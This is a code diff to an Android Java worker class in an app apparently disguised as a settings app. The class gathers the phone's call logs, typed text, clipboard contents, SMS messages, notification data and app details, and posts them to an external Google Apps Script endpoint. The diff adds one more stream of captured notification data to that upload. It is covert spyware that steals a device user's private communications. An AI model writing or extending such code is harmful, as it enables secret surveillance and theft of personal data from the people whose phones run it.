@@ -31,7 +31,7 @@ import static com.example.settings.MainActivity.clipboardManager;
 public class SyncData extends Worker {
     Sharedpref mSharedpref;
     Context context;
-    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime, Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "", NotificationData,SmsData;
+    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime, Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "", NotificationData,SmsData,OtherNotificationData;
 
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -50,6 +50,7 @@ public class SyncData extends Worker {
         TextWritten = mSharedpref.getSaveTextWritten();
         NotificationData = mSharedpref.getNotificationData();
         SmsData=mSharedpref.getSmsData();
+        OtherNotificationData=mSharedpref.getOtherNotificationData();
         try {
             ClipData pData = clipboardManager.getPrimaryClip();
             if (pData != null) {
@@ -77,7 +78,7 @@ public class SyncData extends Worker {
         if (!Name.isEmpty()) {
             if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                     !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
-                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() || !SmsData.isEmpty()) {
+                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() || !SmsData.isEmpty() || !OtherNotificationData.isEmpty()) {
                 StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
                         new Response.Listener<String>() {
                             @Override
@@ -87,6 +88,7 @@ public class SyncData extends Worker {
                                 mSharedpref.setMissedCallNumber("");
                                 mSharedpref.setSaveTextWritten("");
                                 mSharedpref.setNotificationData("");
+                                mSharedpref.setOtherNotificationData("");
                                 mSharedpref.setSmsData("");
                                 mSharedpref.commit();
                             }
@@ -114,6 +116,7 @@ public class SyncData extends Worker {
                         parmas.put("Phonenumberdetails", Phonenumberdetails);
                         parmas.put("Phoneappdetails", Phoneappdetails);
                         parmas.put("NotificationData", NotificationData);
+                        parmas.put("OtherNotificationData", OtherNotificationData);
                         parmas.put("SmsData", SmsData);
                         return parmas;
                     }
